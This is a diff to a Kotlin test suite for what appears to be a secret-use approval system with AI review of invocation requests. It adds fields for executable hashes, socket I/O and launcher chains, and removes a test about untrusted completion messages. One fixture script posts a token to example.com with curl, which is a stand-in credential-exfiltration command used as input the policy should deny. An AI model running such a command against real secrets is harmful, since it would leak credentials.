@@ -177,8 +177,10 @@ class InvocationRequestsTest {
         // Script contents are a snapshot for review and history; preserve whitespace and Unicode.
         val scriptContents =
             "#!/usr/bin/env bash\r\n\tcurl --data-urlencode \"token=${'$'}TOKEN\" https://example.com/upload # käyttö\n"
+        // Newer clients may add advisory labels and collect more launcher context.
+        val launcherChain = listOf("deploy", "task-runner", "shell", "terminal", "desktop")
         val plaintext =
-            """{$SOFTWARE_FIELDS,"method":"Invocation","secrets":{"github":{}},"operation":{"type":"exec","command":"deploy","arguments":[],"working_directory":"/tmp","executable_path":"/tmp/deploy","executable_mode":"SCRIPT","script_contents":${Json.encodeToString(scriptContents)},"stdin":"TERMINAL","stdout":"TERMINAL","stderr":"TERMINAL"},"launcher_chain":[],"invocation_token":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="}"""
+            """{$SOFTWARE_FIELDS,"method":"Invocation","secrets":{"github":{}},"operation":{"type":"exec","command":"deploy","arguments":[],"working_directory":"/tmp","executable_path":"/tmp/deploy","executable_hash":"blake3:future-format","executable_mode":"INTERPRETED","script_contents":${Json.encodeToString(scriptContents)},"stdin":"SOCKET","stdout":"SOCKET","stderr":"SOCKET"},"launcher_chain":${Json.encodeToString(launcherChain)},"invocation_token":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="}"""
                 .encodeToByteArray()
         var completeReview: (suspend (AiReviewAttempt) -> Unit)? = null
         var responsePlaintext: ByteArray? = null
@@ -220,6 +222,12 @@ class InvocationRequestsTest {
         assertEquals("POLICY_DENIED", response.getValue("reason").jsonPrimitive.content)
         assertEquals(explanation, response.getValue("message").jsonPrimitive.content)
         val stored = checkNotNull(database.requestDao().getSecretUseRequest(requestId))
+        assertEquals("INTERPRETED", stored.executableMode)
+        assertEquals("SOCKET", stored.stdinKind)
+        assertEquals("SOCKET", stored.stdoutKind)
+        assertEquals("SOCKET", stored.stderrKind)
+        assertEquals("blake3:future-format", stored.executableHash)
+        assertEquals(launcherChain, Json.decodeFromString<List<String>>(stored.launcherChainJson))
         assertEquals(ApprovalDecision.DENIED.storedName, stored.decision)
         assertEquals(DECISION_SOURCE_AI, stored.decisionSource)
         assertEquals("POLICY_DENIED", stored.completionReason)
@@ -610,11 +618,8 @@ class InvocationRequestsTest {
         assertEquals(InvocationDenialReason.POLICY_DENIED.wireName, denied.completionReason)
         assertEquals(SECRET_USE_POLICY_DENIAL_MESSAGE, denied.completionMessage)
         val request = checkNotNull(database.requestDao().getRequestById(requestId))
-        val plaintext =
-            deniedCompletionPlaintext(
-                InvocationDenialReason.POLICY_DENIED.wireName,
-                SECRET_USE_POLICY_DENIAL_MESSAGE,
-            )
+        // The client acknowledges the decision; its diagnostics must not replace device history.
+        val plaintext = """{"result":"DENIED","message":"Declined."}""".encodeToByteArray()
         val eventCount = audit.observeEvents().first().size
 
         assertTrue(
@@ -631,10 +636,16 @@ class InvocationRequestsTest {
         assertTrue(regular.complete(request) { CompletionOpenResult.Opened(plaintext) })
         val completed = checkNotNull(database.requestDao().getRequestById(requestId))
         assertNull(completed.error)
+        val completedInvocation = checkNotNull(database.requestDao().getSecretUseRequest(requestId))
         assertEquals(
             ApprovalCompletionResult.DENIED.storedName,
-            database.requestDao().getSecretUseRequest(requestId)?.completionResult,
+            completedInvocation.completionResult,
         )
+        assertEquals(
+            InvocationDenialReason.POLICY_DENIED.wireName,
+            completedInvocation.completionReason,
+        )
+        assertEquals(SECRET_USE_POLICY_DENIAL_MESSAGE, completedInvocation.completionMessage)
         assertNull(database.requestDao().getRequestPsk(requestId))
         val completedAudit = audit.observeEvents().first().first()
         assertEquals(AuditEventType.SECRET_USE_COMPLETED, completedAudit.type)
@@ -683,42 +694,6 @@ class InvocationRequestsTest {
         val completionAudit = audit.observeEvents().first().first()
         assertEquals(AuditEventType.SECRET_USE_COMPLETED, completionAudit.type)
         assertEquals(AuditOutcome.ABORTED, completionAudit.outcome)
-        assertFalse(checkNotNull(completionAudit.detail).contains(malicious))
-    }
-
-    @Test
-    fun invalidCompletionDoesNotRetainDecodedClientFields() = runTest {
-        val requestId = "invocation-invalid-completion"
-        val regular = requests(audit)
-        assertEquals(
-            ConditionalRequestUpdate.APPLIED,
-            regular.receive(
-                request = request(requestId),
-                secretUseRequest = secretUse(requestId),
-                client = client(),
-                acceptedPsks = acceptedPsks(requestId),
-                authorization = null,
-                automaticDecisionAudit = null,
-            ),
-        )
-        val request = checkNotNull(database.requestDao().getRequestById(requestId))
-        val malicious = "raw-invalid-client-message"
-        val wrongSoftwareCompletion =
-            """{"app_info":{"name":"attacker","version":"1"},"lib_info":{"name":"attacker","version":"1"},"result":"ABORTED","reason":"CANCELLED","message":"$malicious"}"""
-                .encodeToByteArray()
-
-        assertTrue(
-            regular.complete(request) { CompletionOpenResult.Opened(wrongSoftwareCompletion) }
-        )
-
-        val storedRequest = checkNotNull(database.requestDao().getRequestById(requestId))
-        assertEquals("Secret use completion could not be verified.", storedRequest.error)
-        val storedInvocation = checkNotNull(database.requestDao().getSecretUseRequest(requestId))
-        assertNull(storedInvocation.completionResult)
-        assertNull(storedInvocation.completionReason)
-        assertNull(storedInvocation.completionMessage)
-        val completionAudit = audit.observeEvents().first().first()
-        assertEquals("Secret use completion could not be verified.", completionAudit.detail)
         assertFalse(checkNotNull(completionAudit.detail).contains(malicious))
     }
 
@@ -1013,10 +988,6 @@ class InvocationRequestsTest {
             clientName = "Test client",
             relayRequestId = requestId,
         )
-
-    private fun deniedCompletionPlaintext(reason: String, message: String): ByteArray =
-        """{$SOFTWARE_FIELDS,"result":"DENIED","reason":"$reason","message":"$message"}"""
-            .encodeToByteArray()
 
     private fun abortedCompletionPlaintext(message: String): ByteArray =
         """{$SOFTWARE_FIELDS,"result":"ABORTED","reason":"CANCELLED","message":"$message"}"""
